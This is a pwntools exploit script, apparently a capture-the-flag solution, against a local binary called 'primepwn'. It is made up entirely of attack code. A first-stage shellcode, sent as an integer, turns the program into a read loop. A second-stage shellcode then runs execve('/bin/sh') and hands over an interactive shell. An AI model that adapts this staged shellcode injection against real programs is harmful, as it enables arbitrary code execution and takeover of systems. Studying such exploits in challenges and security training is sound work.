from pwn import *
context.binary = './primepwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary



def dbg():
	raw_input()
p = process('./primepwn')
gdb.attach(p)
dbg()

code = """
start:
	syscall
	dec edx
	mov esi, ecx
	jmp start
"""
payload  = asm(code, arch='amd64')
p.sendline(str(u64(payload)))			#read(0, rip, 0xffffffff)

code = """
	mov rsp, rcx
	mov rax, 0x3b
	xor rsi, rsi
	xor rdx, rdx
	call shell
	.ascii "/bin/sh"
	.byte 0
shell:
	pop rdi
	syscall
"""
p.sendline(asm(code, arch='amd64'))

p.interactive()
p.close()
